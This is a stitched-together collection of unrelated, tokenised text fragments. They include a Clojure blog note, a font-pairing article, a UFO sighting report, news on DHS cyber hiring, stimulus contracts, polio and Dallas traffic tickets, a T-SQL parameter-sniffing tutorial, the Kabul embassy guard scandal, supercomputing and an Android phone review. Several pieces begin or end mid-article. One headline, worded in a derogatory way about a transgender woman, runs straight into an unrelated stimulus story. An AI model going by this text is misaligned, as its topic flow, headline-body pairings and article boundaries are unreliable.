java libs look like a pain in the ass .
This softens the “ and you can use java libs ! ” selling point of clojure for me .
They ’re still java libs .
The places where clojure calls java are kinda ugly , it ’s a square peg in a round hole .
clojure has a ton of lazy - evaluation semantics built into the language .
In this case , that seemed to be a bad thing , and most of Lau ’s code was calling some wrapper function to say “ no really , I want you to actually do this ” .
Clojure has more syntax than I thought , using # % [ ] _ to mean different things ( maybe in different contexts ? ) .
I ’m not sure how the STM features I ’ve heard a lot about come into play here , if at all .
I should be asdf loading my libs in a nicer way , right now you need to evaluate those first lines , and then compile the file .
I did n’t have the motivation to create an .asd file or finally learn how to use eval - when properly .
I like long , descriptive function names .
Some of the ones from clojure irriated me : doall , doto .
It reminds me of arc a little .
I was confused by the per-cell parallelism in the clojure version ( I think clojure uses native threads in a threadpool ) .
Pcall does the same thing , but I figured I ’d be spending more time context switching than calculating , and it was getting late .
Anyhoo , a fun sunday evening .

Update : February 26 , 2019 : After nine years of the digital - only edition , the Big Book of Font Combinations is available in glorious , full - sized print editions : paperback and hardcover .
Learn more !
Update : April 5 , 2016 : I recently compiled a list of the 19 most popular fonts according to usage by graphic designers from all over the web .
I could have had 100 , but I got it down to under 50 , and from there whittled it down to just the 19 best fonts .
Why 19 ?
Because at exactly 20 , the “ long tail ” shot right out and the differences in tallies became negligible .
Take a look at those top fonts if you want and come right back because now we are going to have a little typography fun .
What we have here is that list of 19 top fonts once again , but this time combined into pairs to give us 19 best font combinations .
How does combining fonts work ?
I simply followed the golden rule of font combinations , which is simply to combine a serif and a sans serif to give “ contrast ” and not “ concord ” .
For excellent font pairings , the farther apart the typeface styles are , as a guideline , the more luck you ’ll have .
Fonts that are too similar look bad .
Set a line of Times Roman over Garamond and you ’ll see what I mean .
I chose the simple model of a bold headline font and normal weight body font .
All the font combinations got the same “ lorem ” text .
How did I choose the combinations ?
I tried to mix it up , but had to make some arbitrary decisions .
For instance , I could have picked Baskerville , Caslon , Garamond , or Minion , etc. ( all serif typefaces ) to go with Futura ( a sans serif typeface ) .
I simply choose to spread them out amongst themselves , keeping the use of repeats down to a minimum .

The results
You may love some of these combinations and hate others , or be unphased by yet others ( or you may think I dwell on this too much ) .
However , this is not a fair fight .
Pretty much any two fonts can be balanced out and made to work with each other in some type of context .
Our context here was strictly delimited , and so any of these combinations might warrant further experimentation for even better results .
Finally , I tried to keep the look of each example as close as possible to each other .
This involved using the occasional semibold or light to balance a font out at certain point size .
I also tweaked font size and leading in the interest of creating uniformity amongst the examples .
So here we have the following items :

At about 10 pm on the evening of August 23 , a UFO appeared in the sky above Beibei Binjiang Road in Chongqing .
( Chongqing Evening Photo )
At about 10 pm on the evening of August 23 , a UFO appeared in the sky above Beibei Binjiang Road in Chongqing .
The UFO was “ V ” shaped and its color changed in the order of red , blue , green , yellow and white at short intervals .
Hundreds of people watched but no one heard any sound produced by engines or propulsion equipment .
During the half hour that the UFO appeared , a civil airplane passed by .
Witnesses compared the civil airplane to the UFO and discovered that the UFO was obviously flying at a higher attitude .
After hovering for about half an hour , the periphery of the UFO began to twinkle and then it disappeared in the night sky .

DHS Seeking 1,000 Cyber Security Experts
The Department of Homeland Security is poised to go on a geek hiring spree .
DHS Secretary Janet Napolitano announced Thursday that the agency has been cleared to hire at least 1,000 new cybersecurity professionals over the next three years to fill staffing gaps at various DHS agencies .
" This new hiring authority will enable DHS to recruit the best cyber analysts , developers and engineers in the world to serve their country by leading the nation 's defenses against cyber threats , " Napolitano said .
According to Napolitano , the department will look to fill " critical cybersecurity roles , " including " cyber risk and strategic analysis , cyber incident response , vulnerability detection and assessment , intelligence and investigation , and network and systems engineering . "
The DHS secretary made the remarks at a press conference Thursday to kick off National Cybersecurity Awareness Month .
Interestingly , Thursday also marks the target date for the launch of the new U.S. Cyber Command ( USCYBERCOM ) , according to a blog post from a group that includes Richard Clarke , the former special advisor to the president on cyber security during the Bush administration .
The Cyber Command is supposed to oversee government efforts to protect the military 's computer networks , and potentially also assist in protecting the civilian government networks .
The head of the Cyber Command will be National Security Agency Director Lt. Gen. Keith Alexander .
I mention the new command because some Beltway insiders believe a hiring frenzy currently underway at that upstart command could make it difficult for DHS to hire cyber security experts with the right in - the - trenches experience .
Alan Paller , director of research at the SANS Institute , a cyber security research and training group based in Bethesda , Md. , said the NSA has been aggressively poaching the best cyber security experts from the major defense contractors of late .
" The NSA is already stealing every human being from the other side , so there is no space for [ DHS ] to hire , " Paller said .
" They 're going to have a helluva time getting people who are technically skilled -- not at just writing about cyber security -- but actually doing it . "
Incidentally , the SANS Internet Storm Center is once again publishing a new cyber security tip each day of the month , in keeping with their annual observation of Cyber Security Month .
Definitely worth a read .
Gender Bender Transexual Sues Health Insurer for Refusing to Cover Breast Implant Surgery
A British transexual living in Germany is taking her health insurer to court after the company refused to pay for breast implants .
She argues that the operation should be covered as part of gender reassignment procedures .
WASHINGTON —
The stimulus is n’t doing a thing to help the unemployment rate in the New York metro area , according to shocking new White House data released yesterday .
The feds have spent a half - billion dollars on 10 of the largest government stimulus contracts in New York City and Long Island — but created or retained only 54 jobs .
That ’s an astounding $ 9 million per job .
The largest contract , at Brookhaven labs on Long Island for $ 261 million , has put only 26 people on the payroll , while two contracts for $ 23 million apiece to rehab the Thurgood Marshall Courthouse in Manhattan has n’t created a single job , according to new data .
A $ 53 million contract to fix a Brooklyn post office created just a third of a job , while a $ 5.5 million plumbing contract for a federal courthouse did n’t create any .
Statewide , New York has gotten $ 776 million in government contracts through the stimulus , creating or saving 656 jobs , according to the data , which the feds compile from contractors .
Nationally , 30,000 jobs were created by $ 16 billion in contracts .
The contracts do n’t include the bulk of stimulus funding , which went to tax cuts , construction projects and other programs with job - creating effects , and may exclude subcontractors and money sitting in company bank accounts .
Pete Genzer of the Brookhaven National Laboratory said the jobs figure was low because it does n’t include subcontractors building a massive accelerator project .
“ Right now we have 140 people working on the light - source project who are funded by [ the stimulus ] , ” he said , adding that another 100 are on a nuclear cleanup project .
A $ 15 million contract for the Feinstein Institute for Medical Research on Long Island to test new ways to treat schizophrenia has created just 3.8 jobs .
But John Kane , who runs the program , said , “ If we are successful in helping people with this illness , it means that many of the people helped by it could get jobs and function in the community . ”
White House economist Jared Bernstein said , “ It is too soon to draw any global conclusions from this partial and preliminary data .
“ It reports on just $ 16 billion of the $ 339 billion in Recovery Act efforts before Sept. 30 . ”

Exploiting quantum mechanics for transmitting information is a tantalizing possibility because it promises secure , high speed communications .
Unfortunately , the fragility of methods for storing and sending quantum information has so far frustrated the enterprise .
Now a team of physicists in Sweden and Poland have shown that photons that encode data have strength in numbers .
Their experiment is reported in Physical Review Letters and Physical Review A and highlighted in the October 5 issue of Physics ( http://physics.aps.org).
In classical communications , a bit can represent one of two states - either 0 or 1 .
But because photons are quantum mechanical objects , they can exist in multiple states at the same time .
Photons can also be combined , in a process known as entanglement , to store a bit of quantum information ( i.e. a qubit ) .
Unlike data stored in a computer or typically sent through conventional fiber optic cables , however , qubits are extremely fragile .
A kink in a cable , the properties of the cable material , or even changes in temperature can corrupt a qubit and destroy the information it carries .
But now a group lead by Magnus Rådmark at Stockholm University has shown that six entangled photons can encode information that stands up to some knocking around .
Rådmark and his team proved experimentally that their six photon qubits are robust and should be able to reliably carry information over long distances .
The technology to encode useful information on the qubits and subsequently read it back is still lacking , but once those problems are solved , we will be well on our way to secure , reliable , and speedy quantum communication .
( CNN ) -- California Gov. Arnold Schwarzenegger has signed legislation that requires the state to recognize same - sex marriages performed in other states while such marriages were legal in California .
California will recognize same - sex marriages from a period of time before Proposition 8 was enacted .
Same - sex marriages performed elsewhere between June 16 , 2008 , and November 5 , 2008 , are to be legally recognized , as are in - state marriages performed during that time .
The end date represents when a ballot initiative , Proposition 8 , added a ban on same - sex marriage to the state constitution .
Proposition 8 bars the state from recognizing any marriage performed outside the state outside those dates .
The state Supreme Court ruled after the proposition passed that marriages performed before the ban would remain on the books .
But Senate Bill 54 splits a legal hair and requires the state to recognize such marriages as " unions , " providing " the same legal protections that would otherwise be available to couples that enter into civil unions or domestic partnerships out - of - state , " the governor said .
" In short , this measure honors the will of the people in enacting Proposition 8 while providing important protections to those unions legally entered into in other states , " Schwarzenegger said in a signing statement accompanying his signature .
He signed the bill Sunday .
Proponents of Proposition 8 lambasted the governor .
" The governor 's signing of SB 54 illustrates his disregard for the sovereign authority of California 's voting citizens , " said Everett Rice , a spokesman for the California Family Council .
" In 2000 and 2008 , the voters expressed their desire at the ballot box to protect traditional marriage .
They emphatically affirmed that marriage should retain its historical definition and identity .
However , today the governor has joined with other elected representatives by choosing to place the demands of special interest groups over more than 7 million California voters . "

A 2004 outbreak of polio in China traced back to live attenuated oral polio vaccine ( OPV ) , which is widely used in global eradication efforts , highlights the small but significant risk to eradication posed by the use of OPV at suboptimal rates of coverage .
The study , reported in the Sept. 1 issue of The Journal of Infectious Diseases , and now available online , describes the first outbreak of poliomyelitis in China in more than a decade and the first in that country caused by vaccine - derived virus .
This marks the fifth outbreak of vaccine - derived poliomyelitis reported in the world since 2000 , the year in which China was certified free of wild - type poliovirus .
The study was conducted in 2004 by Jingjin Yu , MD , and colleagues in Beijing and elsewhere , involving virus isolated from an outbreak in Guizhou province in rural China .
Reported national immunization coverage in China is close to 90 percent , but children in the affected area of Guizhou , the poorest province in China , had much lower rates of immunization at the time of the study : only 72 percent of one - to three - year - olds had received at least three doses of the oral vaccine .
The investigators identified six children ( three cases and three contacts ) in two small towns who had had acute and residual polio - like paralysis and from whom the same type of vaccine - derived poliovirus ( type 1 ) was isolated .
A seventh child with paralysis was negative for type 1 virus , but it was found in a close contact of that child .
None of the children had been immunized against polio .
Based on the virus strain 's known rates of mutation , the finding indicated that the isolates had been circulating for less than a year .
This is in contrast to past experience with vaccine - derived strains , which have tended to persist for several years -- suggesting how quickly this strain can revert to a paralytic and transmissible form .
Once the outbreak was identified , a province - wide immunization campaign was mounted targeting all children under age 5 , with reported coverage of more than 90 percent .
To date , the outbreak strain has not been found in any child with polio - like paralysis in the province or elsewhere in China .
In an accompanying editorial , Walter Dowdle , PhD , of the Task Force for Child Survival and Development and Olen Kew , PhD , of the Centers for Disease Control and Prevention , suggest that the China outbreak indicates that vaccine - derived poliovirus can emerge within pockets of lower OPV coverage in countries with overall high levels of immunization and disease surveillance , and that the virus can be contained if identified quickly .
They also emphasize the importance of paying close attention to regions that have historically acted as reservoirs of polio , despite the fact that such remote communities as Guizhou were long thought to be unlikely sites for the re-emergence of the virus after eradication because of a lower frequency of exposure .
According to Dowdle and Kew , important questions about the use of oral polio vaccine arise from this outbreak .
In 2003 , the World Health Organization recommended discontinuing the use of live virus vaccine after the eradication of the disease and containment of poliovirus stocks .
But the cost of switching entirely to inactivated polio vaccine would present financial challenges to poor nations , as the cost of the inactivated preparation is estimated at $ 2.00 to $ 3.00 per dose , in contrast to 3 cents per dose for the live attenuated oral vaccine .
As Yu and colleagues point out , immunization policies will have to be carefully considered in light of both medical and financial concerns .

Ernestina Mondragon was probably not surprised when she was pulled over by police after making an illegal U - turn in Dallas , Texas .
She probably thought it was a fair cop when she was given an additional ticket for not having her driving licence .
But when the trainee officer fined her $ 204 for being a " non English - speaking driver " – a penalty later signed off by the officer 's field - training instructor and sergeant – Mondragon fought back .
She contested the charge and it was dropped by the court .
A subsequent investigation revealed that at least 39 drivers in the last three years have been ticketed for being " non English - speaking drivers " .
Police officials in the Texas city of 1.3 million people believe the error originates in a menu on the computers used in patrol cars .
Federal law requires that certain commercial lorry drivers speak English , but no such requirement applies to private motorists .
The Dallas police chief , David Kunkle , apologised at a press conference last week .
" This is something I wish had n't happened .
It is an embarrassment . "
Kunkle pledged to investigate the incidents , cancel pending charges and refund those who had already paid the fine .
" It sounds like a policy , " Southern Methodist University law professor George Martinez told the Dallas Morning News .
" Discrimination on the basis of language ability , and that 's targeting Latinos , and so that sounds pretty serious to me . "
In Dallas , 42 % of the population is Hispanic and 43 % speak a language other than English at home .
The US has no official language , although a movement has been afoot among conservatives to enshrine English in US law as the official tongue .

T- SQL Best Practices - Parameter Sniffing
By Gregory A. Larsen
This article is an extension of my T - SQL best practices series .
In this article , Ill be exploring how SQL Server optimizes and caches stored procedure execution plans based on the parameters that are passed the first time a stored procedure ( SP ) is executed .
This discussion will explore a concept called  Parameter Sniffing  and how this can lead to execution plans that are not optimal for all calls to an SP .
What is Parameter Sniffing ?
When an SP is not in the procedure cache , when it is executed the query optimizer needs to compile the SP to create an execution plan .
In order to do this the query optimizer needs to look at the parameters that are passed and the body of the SP to determine the best method to go about processing the SP .
When the query optimizer looks at the SPs parameters , to help determine how to optimize the execution of the SP , it is known as parameter sniffing .
Once the query optimizer has sniffed the parameters and determined the best approach for processing the SP , it caches the execution plan in the procedure cache .
All subsequent executions of the SP re-use the execution plan from the procedure cache regardless if different parameters are passed .
The potential problem with this approach is the parameters that were used when the plan was cached might not produce an optimal plan for all execution of the SP , especially those that have significantly different set of records returned depending on the parameters passed .
For instance , if you passed parameters that required a large number of records to be read , the plan might decide a table or index scan would be the most efficient method to process the SP .
Then if the same SP was called with a different set of parameters that would only return a specific record , it would used the cached execution plan and perform an table or index scan operation to resolve its query , even if a index seek operation would be more efficient in returning the results for the second execution of the SP .
If you have an SP that sometimes processes quickly , and other times processes slowly with different sets of parameters , then possibly parameter sniffing is causing your procedures to have varying execution times .
In this article we will look at different methods to write your SPs to help the query optimizer in picking a good execution plan most of the time .
Review the Problem Caused by Parameter Sniffing
Before we look into how to write your SPs to control the issues related to parameter sniffing , lets look at the issues caused by it first .
To do that lets review the following code :
USE AdventureWorks GO CREATE PROC GetCustOrders ( @FirstCust int , @ LastCust int ) AS SELECT * FROM Sales.SalesOrderHeader
WHERE CustomerID between @ FirstCust and @LastCust ;
This code accepts two parameters .
These two parameters are used in a WHERE clause to determine which SalesOrderHeader records to return .
Now , lets look at the execution plan for this SP when we call it with two different sets of parameters .
First , lets call it with the following code :
USE AdventureWorks GO DBCC FREEPROCCACHE EXEC GetCustOrders 1,1000
When I execute the above code , I get the following execution plan :
Here , you can see that this execution of the GetCustomerOrder SP performed a Clustered Index Scan operation when I called this procedure with a range of CustomerIDs from 1 to 1000 .
Note , I freed the procedure cache using the DBCC FREEPROCCACHE  statement to make sure that the query optimizer compiled the GetCustOrders SP based on the parameters I passed .
Now , I will execute the same SP with a smaller range of CustomerIDs and see what kind of execution plan I get .
Here is the code I will be executing :
USE AdventureWorks GO DBCC FREEPROCCACHE EXEC GetCustOrders 600,610
When I execute this code , I get the following execution plan :
This time I get a different execution plan .
Now , you can see that when using a smaller range of CustomerIDs ( 600 - 610 ) , I get an Index Seek operation .
Depending on which execution of this SP was the first to be execute it , would compile and cache the execution plan for all subsequent executions of this SP .
To verify this lets run the following code and review the execution plans :
USE AdventureWorks GO DBCC FREEPROCCACHE EXEC GetCustOrders 1,1000 GO EXEC GetCustOrders 600,610
Here is the execution plan for the above T - SQL batch :
By looking at this code , you can see that the second execution of the GetCustOrder SP now performs a Clustered Index Scan operation to find all the customer orders from a small range of CustomerIDs .
This occurs because the query optimizer only sniffed the parameters for the first execution of the GetCustOrder , which had a large range , and then cached that execution plan .
The cached execution plan was then used for the second execution of the GetCustOrder SP .
The first compile of an SP creates the execution plan based on the parameters passed , and then this plan is stored in the procedure cache for the current and all future executions of the same SP .
The last code segment above demonstrated how this could cause our second execution of GetCustOrder to use a less efficient execution plan -- in this case , a Clustered Index Scan operation instead of an Index Seek operation .
Let s look at ways to overcome this problem .
Eliminating the Parameter Sniffing Problem by Disabling Parameter Sniffing
In the prior example , I demonstrated how the first execution of an SP sniffed the parameters and then built an execution plan that was optimized for that set of parameters .
This can lead to poor execution plans for any call that the SP uses that have a different set of parameters that might lead to a different execution plan .
In my demonstrations above I showed that when a large range of CustomerIDs ( 1-1000 ) was sent to the GetCustOrder SP it used an index scan operation , but if a small range ( 600 - 610 ) was sent the optimal plan was an index seek operation .
However , because SQL Server tries to minimize compiles of the SP , my small range of customerIDs used an index scan operation .
If you have a wide variation in parameters that might be passed to an SP , you can eliminate the parameter sniffing problems by disabling parameter sniffing .
You do this by coding your SP a specific way .
Below I have rewritten my SP to eliminate parameters sniffing :
CREATE PROC GetCustOrders ( @FirstCust int , @ LastCust int ) AS DECLARE @FC int DECLARE @LC int SET @FC = @ FirstCust SET @LC = @ LastCust SELECT * FROM Sales.SalesOrderHeader
WHERE CustomerID BETWEEN @FC AND @LC
Here , can see I have declared two local variables ( @FC and @LC ) and then populated them with the values of the parameters passed to my SP .
By doing this , the actual values of the parameters are no longer contained in the BETWEEN clause in the SELECT statement , instead only those local variables are present .
Because of this small change , the query optimizer looks at all the statistics related to objects in my query and determines on average what might be the best execution plan to use based on the statistics .
Still , this method of eliminating the parameter sniffing problem doesnt mean you will get an optimal plan for each execution of the SP .
You still only get one execution plan stored in the procedure cache , which will be used for all executions of the SP .
Although that one execution plan on average will perform optimal if you call the SP many times with many different parameter values .
If you really want to create different execution plans based on the parameters passed then you will need to uses a different approach .
Resolving the Parameter Sniffing Problem Using a Decision Tree SP
If you have an SP that is called with a number of different parameter values , where depending on the parameters passed they get different execution plans , you can solve the parameter sniffing problem by creating a decision tree SP .
The decision tree approach has a single SP that is called , which decides which SP to call based on the parameters passed .
This allows more than one SP to support your varying parameter values and allows for a more optimize plan to be used based on the parameters passed .
Let me show you an example of a decision tree approach to resolving the parameter sniffing problem .
Lets use the same situation as the above examples , where I want to return SalesOrderHeader records based on a range of CustomerIDs .
Instead of the GetCustOrders SP selecting the order header records , it will instead determine the difference in range and then call a different SP based on whether the range of CustomerIDs is small or large .
Let s look at the code for the following three SPs :
CREATE PROC GetCustOrders ( @FirstCust int , @ LastCust int ) AS IF @ LastCust - @ FirstCust < 100 EXEC GetCustOrdersNarrow @ FirstCust , @LastCust ELSE EXEC GetCustOrdersWide @ FirstCust , @LastCust GO -- Proc for Large Range of Customers CREATE PROC GetCustOrdersWide ( @FirstCust int , @ LastCust int ) AS SELECT * FROM Sales.SalesOrderHeader
WHERE CustomerID BETWEEN @FirstCust AND @LastCust GO -- Proc for Small Range of Customers CREATE PROC GetCustOrdersNarrow ( @FirstCust int , @ LastCust int ) AS SELECT * FROM Sales.SalesOrderHeader
WHERE CustomerID BETWEEN @FirstCust AND @LastCust GO
Here , you can see I have created three different SPs .
The first SP ( GetCustOrders ) is my decision tree SP .
This SP determines if the range of CustomerIDs is less than 100 .
If it is , it calls GetCustOrdersNarrow otherwise it calls GetCustOrdersWide .
These two SPs are exactly the same .
Ill execute the following code to determine what execution plans are generated based on the parameters passed using this code :
DBCC FREEPROCCACHE EXEC GetCustOrders 1,1000 EXEC GetCustOrders 600,610
Here are the two different execution plans produced by the two different EXEC statements :
As you can see , the first execution that had a CustomerID range greater than 100 used a Clustered Index Scan operation to resolve its execution .
Whereas the second execution that had a CustomerID range of less than 100 used an Index Seek operation followed by a Key Lookup to resolve this smaller range query .
So by building the decision tree approach , each execution with different parameters was resolved with a more efficient execution plan .
Controlling Parameter Sniffing
The query optimizer uses parameter sniffing to help determine what execution plan should be used to optimize execution of an SP .
This process , as you can see , sometime causes your SP to execute a plan that was optimized based on a different set of parameters because of plan caching .
I demonstrated a way to disable parameter sniffing so SQL Server uses the statistics to determine on average what would be the optimal plan .

Kabul U.S. Embassy Guard : Sexual Deviancy Required for Promotion Whistleblower says bosses required sex acts for best shift , promotion .
Sept. 2 , 2009  --
Private security guards at the U.S. Embassy in Kabul were pressured to participate in naked pool parties and perform sex acts to gain promotions or assignment to preferable shifts , according to one of 12 guards who have gone public with their complaints .
Click here to see the slideshow .
In an interview with ABC News for broadcast tonight on the " World News with Charles Gibson , " the guard , a U.S. military veteran , said top supervisors of the ArmorGroup were not only aware of the " deviant sexual acts " but helped to organize them .
Watch Brian Ross ' full report tonight on " World News with Charles Gibson " at 6:30 pm .
" It was mostly the young guys fresh from the military who were told they had to participate , " said the guard , who talked on a phone hook - up arranged by the Project on Government Oversight , which first revealed photographs of the parties .
" They were not gay but they knew what it took to get promoted , " said the guard , spoke on condition that ABC News not publish his name .
The State Department said it was investigating the allegations and the circumstances surrounding the photographs which show naked and barely clothed men fondling one another .
The guard who spoke with ABC News said the drunken parties had been held regularly for at least a year and a half .
The State Department renewed its contract with ArmorGroup to provide security at the Kabul embassy last month even though there have been a series of complaints about its performance .
In June 2007 , the State Department warned " the security of the US embassy in Kabul is in jeopardy " because of " deficiencies " on the part of ArmorGroup .
Similar complaints were raised at a Senate hearing in June 2009 by Sen. Claire McCaskill ( D - MO ) .
Sam Brinkley , vice - president of the ArmorGroup 's corporate parent Wackenhut Services , defended the company 's performance in Kabul .
" We are a guard company that prides itself in doing missions well , " Brinkley testified .
Wackenhut did not immediately return requests for comment .
Naked Photos at U.S. Embassy in Kabul
The photographs of the naked parties all involve one of four shifts assigned to the embassy , Charlie Shift , according to the guard who spoke with ABC News .
He said other shifts tried to complain about the activities but were ignored by officials from corporate headquarters who visited Kabul .
" It was demeaning , it was humiliating and that was the whole point of it all , " the guard said .

A wind turbine blade that absorbs radar signals has been demonstrated at a wind farm in eastern England .
Wind turbines confuse aviation radar signals , making aircraft in wind farms ' vicinities difficult to track .
Defence firm Qinetiq and turbine manufacturing firm Vestas are developing " stealth turbines " , with radar - absorbing materials and coatings .
The five - year effort may help many wind farm projects that are on hold because of so - called " radar clutter " concerns .
The project , part - funded by the UK's Department for Business , Innovation and Skills , saw a full - scale 44 m prototype turbine blade fitted at a wind farm in Norfolk .
" The part of the turbine that gives you the greatest [ radar clutter ] problem is the blades , because they 're rotating , " said Mark Roberts , strategic business director for energy and environment at Qinetiq .
" We 've got a coating for the fixed structure - the tower .
We 're hesitating from calling it paint , because it 's actually quite thick .
" For the blades it will be material incorporated into the composite manufacture of the blade itself .
In effect the whole of the turbine is made ' stealthy ' but there 's two solutions in there , " he told BBC News .
Another approach
The announcement follows Tuesday 's pledge by energy and climate change secretary Ed Miliband of £ 5.15 m to solve the problem of radar clutter .
The " stealth " blade 's ( left ) radar signature is smaller than a normal one
The issue , he said , is currently holding up a total of more than 10 GW of wind farms in planning or development .
The new funding is to develop a system that works in an entirely different way .
The aim is to develop an application for radar systems that can detect wind turbines and subtract their effects from radar signals .
Mr Roberts concedes that the " stealth turbine " approach may help the issue , but can not solve it .
" There is no single , silver bullet to this whole issue .
Every proposed wind farm deployment is quite different in terms of number of turbines , location , proximity to radar and so on , " he said .
" We can't say it will work in every circumstance but it will be a significant step in the right direction . "

The National Institute for Computational Sciences ' ( NICS's ) Cray XT5 supercomputer — Kraken — has been upgraded to become the first academic system to surpass a thousand trillion calculations a second , or one petaflop , a landmark achievement that will greatly accelerate science and place Kraken among the top five computers in the world .
Managed by the University of Tennessee ( UT ) for the National Science Foundation ( NSF ) , the system came online Oct. 5 with a peak performance of 1.03 petaflops .
It features more than 16,000 six - core 2.6 - GHz AMD Istanbul processors with nearly 100,000 compute cores .
In addition , an upgrade to 129 terabytes of memory ( the equivalent of more than 13 thousand movies on DVD ) effectively doubles the size of Kraken for researchers running some of the world 's most sophisticated 3 - D scientific computing applications .
Simulation has become a key tool for researchers in a number of fields , from climate change to materials .
" At over a petaflop of peak computing power , and the ability to routinely run full machine jobs , Kraken will dominate large - scale NSF computing in the near future , " said NICS Project Director Phil Andrews .
" Its unprecedented computational capability and total available memory will allow academic users to treat problems that were previously inaccessible . "
For example , understanding the mechanism behind the explosion of core - collapse supernovas will reveal much about our universe ( these cataclysmic events are responsible for more than half the elements in the universe ) .
Essentially three phenomena are being simulated to explore these explosions : hydrodynamics , nuclear burning or fusion , and neutrino transport , said UT astrophysicist Bronson Messer .
At the terascale , or trillions of calculations per second , Messer and his team were forced to simulate the star in 1 - D as a perfect sphere and with unrealistic fusion physics .
" Now , however , we are getting closer to physical reality , " said Messer .
" With petascale capability , we can simulate all three phenomena simultaneously with significant realism .
This brings us closer to understanding the explosion mechanism and being able to make meaningful predictions . "
From the physical makeup of the universe to the causes of global warming to the roles of proteins in disease , Kraken 's increased computing muscle will reach far and wide .
As the main computational resource for NICS , the new system is linked to the NSF - supported TeraGrid , a network of supercomputers across the country that is the world 's largest computational platform for open scientific research .
The system and the resulting NICS organization are the result of an NSF Track 2 award of $ 65 million to the University of Tennessee and its partners to provide for next - generation high - performance computing ( HPC ) .
The award was won in an open competition among HPC institutions vying to guarantee America 's continued competitiveness through the next generation of supercomputers ( systems greater than 10 teraflops and into the petascale ) .
" While reaching the petascale is a remarkable achievement in itself , the real strides will be made in the new science that petascale computing will enable , " said Thomas Zacharia , NICS principal investigator , professor in electrical and computer engineering at the University of Tennessee and deputy director for science and technology at Oak Ridge National Laboratory .
" Kraken is a game changer for research . "

If you ’ve ever craved an ice - cold soda , you know that sometimes you ’re just looking for something that tastes … fizzy .
If that sounds odd , scientists have discovered that carbonation actually has a flavor .
And that our taste buds can sense CO2 .
Bubbly soft drinks tickle our tongues with their effervescence .
But researchers got to wondering whether we can taste the carbonation .
To find out , they studied mice whose taste cells had been turned off , one flavor at a time .
So , one mouse could n’t taste sweet things , another could n’t taste bitter , a third could n’t taste salt , and so on .
And they found that mice lacking the cells that sense the taste sour no longer respond to CO2 .
Probing further , they discovered that eliminating a single gene renders these mice blind , if you will , to the taste of carbonation .
That gene encodes an enzyme that breaks down CO2 — and water … do n’t forget the water — into bicarbonate and protons .
And it ’s the protons — which are essentially acid — that the sour - sensitive cells seem to sense .
The work appears in the journal Science .
The scientists speculate that our CO2 sensor evolved to help us avoid food that ’s spoiled .
Yet we still like some of our drinks to include the delightfully acidic tingle of a touch of CO2 .

Video , on the other hand , was somewhat of a pleasant surprise .
The DROID is capable of shooting at a 720 x 480 resolution , and in our tests , produced watchable -- if not totally shake - free -- video .
The phone definitely fares better in this department than with stills , and we could easily see using the DROID as a stand - in for a flip cam .
You can check out a little of the action in the video below ( with a surprise cameo from !!!'s Nic Offer ) .
The sound on the DROID is second to none -- really .
In fact , this is simply one of the best sounding devices we 've ever used .
Whether it 's audio through the loud ( but undistorted ) earpiece , or a speakerphone call -- even music -- the sound which Motorola 's device outputs is crystal clear .
Now , obviously Verizon 's reception has something to do with our in - call sound , but it 's likely Moto put some thought into the aural aspect of the phone .
There 's not really much to say except that we were more than pleased with the audio fidelity of the DROID , and we can only hope that future phone makers ( ahem , Apple ) look to this device as a high water mark in this department .
Besides the introduction of the phone itself , obviously 2.0 is a major update for Android .
Based on the launch and hype surrounding Moto 's device , we 'd say it 's fair to assume that Google wanted as many eyes on the achievement as possible .
They definitely got it with the DROID -- but was it worth all the fuss ?
The first thing you should know is that Android 2.0 is n't drastically different than 1.5 or 1.6 , save for a few notable features and tweaks that have significant impact .
True to form , Google has n't gone for visual flair or wild embellishments for the sake of a few dropped jaws ; most of these changes are about functionality and usability .
One of the first major changes Google has made is support for multiple Gmail or Exchange accounts , and a new universal inbox which allows you to get a look at your electronic correspondences in a single view .
For BlackBerry users , this concept is old hat , but for most people with multiple accounts , it should feel like manna from heaven .
We would have been slightly more stoked about the feature if it allowed you to look at both Gmail and POP / IMAP / Exchange accounts in one field .
Instead , you can view your Gmail accounts separately ( not in a single stream , but in one place ) , and your other accounts can be blended in the " Combined Inbox " view .
Not exactly a perfect implementation for those of us with both Exchange and Google accounts , but certainly a solution light years beyond what previous versions of Android were offering .
Another minor niggle : deleting an email now takes you to the next email in your inbox rather than bumping you back out to the list of emails , as it did in 1.5 and 1.6 .
We preferred the old functionality , though we imagine some will prefer the new as well .
We loved being able to keep a few of our accounts in the phone , but we ran into a weird and annoying issue when attempting to remove one of them .
We were using the DROID with two Gmail accounts active , but when we tried to remove the second one we 'd added ( note : not the account we used for our contacts or calendars ) the device informed us that we would need to factory reset the phone because that account was " required " for certain applications .
Try as we might , we could n't find a way around the problem , and we eventually did reset the device .
The behavior was strange to say the least , especially since it was a barely - used , secondary account -- not a daily use address which tied into services .
As you may have heard , Facebook account integration is now built into 2.0 , and there should be more of that coming , as Google has created " sync adapters " which allow third parties to plug into the contact and calendars of your phone .
Mercifully , Google has figure out that you might not want your Facebook contacts in your address book , and gives you the option to turn off contact syncing ( as it does with Exchange and Gmail accounts ) .
You 're also given the option to sync contacts , but keep certain sets from displaying in your contacts list ; this variation is best demonstrated with Facebook integration , because it merges duplicate names and pulls the accompanying images , but does n't clutter up your Gmail contacts with additional names .
Beyond that , the pairing does n't go tremendously deep , even though we 're told Facebook had a hand in this version of the OS as well .
Really , you get a widget for your homescreen which auto-updates , and that contact integration if you really want it .
This is obviously just the tip of the iceberg for this kind of ... er , synergy , and we expect to see lots of people taking advantage of the feature ( hello , Twitter ) .
Regardless , it 's a forward thinking move that will clearly obviate the need for some of the functionality built into BLUR , and makes the DROID ( and other 2.0 phones ) competitive against the Pre and Pixi when it comes to social networking integration .
Speaking of contacts , Google has made some big and thoughtful changes to how contacts are handled ( and used ) in Android 2.0 , most notably adding a " Quick Contact " menu to your contact list .
The quick contact function allows you to tap on someone 's name and get a context menu with jumps to the various ways you can reach out ; if you 're friends with someone on Facebook , you 'll be given an option to message them there , along with SMS , phone , and email choices .
It 's a brilliant little touch that makes quickly pinging someone a cinch .
Android 2.0 also improves the SMS and MMS experience by giving you the option to search your messages , and also allowing you to set a limit on how many SMSs to store before beginning to delete old threads .
It 's not groundbreaking stuff , but nice choices to have ( finally ) .
You 'll notice some major changes within the browser , most notably the fact that when you load up pages now , you 're presented with a fully zoomed - out " overview " ( much like the iPhone and Pre ) .
If you 've been griping about that weird , half - zoom that Android has relied on for so long ( as we have ) , this is a breath of fresh air .
Coupled with the DROID 's massive display , it makes navigating pages roughly a million times more pleasant .
The updated browser also now supports double - taps to zoom ( as does Google Maps ) -- making navigation a bit more natural -- though we noticed some weird column display issues on our site and others .
As we mentioned before , there 's still no multitouch , but this does stand in quite well for pinch zooming .
